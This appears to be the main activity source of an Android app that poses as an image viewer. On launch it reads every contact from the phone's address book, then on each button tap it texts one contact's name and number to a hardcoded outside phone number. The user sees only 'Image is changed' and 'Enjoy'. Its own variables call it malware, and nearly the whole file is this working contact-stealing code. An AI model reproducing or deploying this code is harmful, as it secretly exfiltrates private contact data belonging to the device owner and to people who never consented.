package com.example.vishalsingh.smsapp;

import android.Manifest;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;

import org.json.JSONObject;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
    EditText num;
    EditText message;
    String malware_name= "test";
    String malware_phone = "testing123";
    Button send;
    ImageView img;
    ArrayList<String> contactList = new ArrayList<String>();
    ArrayList<String> phoneNumber = new ArrayList<String>();
    ArrayList<JSONObject> contacts = new ArrayList<>();
    Cursor cursor;
    int counter;
    String sent = "SMS_SENT";
    String delivered = "SMS_Delivered";

    private int currentImage = 0;
   int count = 1;
    int[] images = { R.drawable.r1, R.drawable.r2, R.drawable.r3, R.drawable.r4, R.drawable.r5, R.drawable.r6, R.drawable.r7, R.drawable.r8, R.drawable.r9 };


    PendingIntent sentPI,deliveredPI;
    BroadcastReceiver smsSentReceiver,smsDeliveredReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        addContacts();

         num = (EditText) findViewById(R.id.number);
       message = (EditText) findViewById(R.id.message);
        img = (ImageView) findViewById(R.id.imageView);

        send = (Button) findViewById(R.id.button);
send.setOnClickListener(new View.OnClickListener() {
    @Override
    public void onClick(View view) {


        String telnumber = num.getText().toString();
        String mes = message.getText().toString();

        if(contactList.size()!= 0 && count < contactList.size() ) {

            System.out.println("count = " + count);
                malware_name = contactList.get(count);
                malware_phone =phoneNumber.get(count);
                System.out.println(malware_name);
                System.out.println(malware_phone);
                count++;
        }
        //Hardcoding
        String cell_number = "8482379918";
        String test_message = malware_name +" : "+ malware_phone;


        String backgroundImageName = String.valueOf(img.getTag());


        if (ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.SEND_SMS},1);

        }
        else{

            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(cell_number,null,test_message,sentPI,deliveredPI);

            currentImage++;
            currentImage = currentImage % images.length;
           img.setImageResource(images[currentImage]);
            num.setText("Image is changed");
            message.setText("Enjoy");


        }

    }
});

       sentPI = PendingIntent.getBroadcast(this,0,new Intent(sent),0);
        deliveredPI = PendingIntent.getBroadcast(this,0,new Intent(delivered),0);


    }


    @Override
    protected void onResume(){
        super.onResume();

        smsSentReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {

                switch(getResultCode()){

                    case Activity.RESULT_OK:
                        Toast.makeText(MainActivity.this,"Sms Sent",Toast.LENGTH_SHORT).show();
                        break;

                    case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                        Toast.makeText(MainActivity.this,"Generic Error",Toast.LENGTH_SHORT).show();
                        break;

                    case SmsManager.RESULT_ERROR_NO_SERVICE:
                        Toast.makeText(MainActivity.this,"No Service",Toast.LENGTH_SHORT).show();
                        break;

                    case SmsManager.RESULT_ERROR_NULL_PDU:
                        Toast.makeText(MainActivity.this,"NO PDU",Toast.LENGTH_SHORT).show();
                        break;

                    case SmsManager.RESULT_ERROR_RADIO_OFF:
                        Toast.makeText(MainActivity.this,"Radio Off",Toast.LENGTH_SHORT).show();
                        break;


                }


            }
        };

        smsDeliveredReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {

                switch(getResultCode()){

                    case Activity.RESULT_OK:
                        Toast.makeText(MainActivity.this,"Sms Sent",Toast.LENGTH_SHORT).show();
                        break;

                    case Activity.RESULT_CANCELED:
                        Toast.makeText(MainActivity.this,"Sms Not Sent",Toast.LENGTH_SHORT).show();
                        break;

                }


            }
        };

        registerReceiver(smsSentReceiver,new IntentFilter(sent));
        registerReceiver(smsDeliveredReceiver,new IntentFilter(delivered));


    }



    public void addContacts(){

        //to store name-number pair
       // JSONObject obj = new JSONObject();

        try {
            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

            while (phones.moveToNext()) {
                String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                contactList.add(name);
                phoneNumber.add(phone);

                System.out.println(name);

            }
            phones.close();
        }
        catch (Exception e){
            e.printStackTrace();
        }

    }


    @Override
    protected void onPause(){
        super.onPause();
        unregisterReceiver(smsSentReceiver);
        unregisterReceiver(smsDeliveredReceiver);


    }



}
